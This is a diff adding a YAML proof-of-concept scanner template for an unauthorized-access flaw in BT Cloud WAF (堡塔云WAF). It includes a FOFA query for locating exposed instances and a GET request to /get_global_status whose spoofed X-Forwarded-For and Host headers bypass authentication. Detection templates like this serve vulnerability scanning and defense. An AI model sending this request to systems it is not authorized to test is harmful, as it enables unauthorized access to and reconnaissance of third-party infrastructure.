@@ -1,0 +1,19 @@
+id: poc-yaml-bt-waf-unauthorized-access
+info:
+  name: 堡塔云WAF 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 堡塔云WAF
+  fofa: body="堡塔云WAF"
+requests:
+- method: GET
+  path: /get_global_status
+  headers:
+    X-Forwarded-For: 127.0.0.1
+    Host: 127.0.0.251
+  expression: "status_code == 200 && \ncontains(headers,\"application/json\") && \n\
+    contains(body,\"waiting\") &&\ncontains(body,\"recv_bytes\") &&\ncontains(body,\"\
+    proxy_count\") &&\ncontains(body,\"spider_google\")\n"
+variables: {}
+transport: http
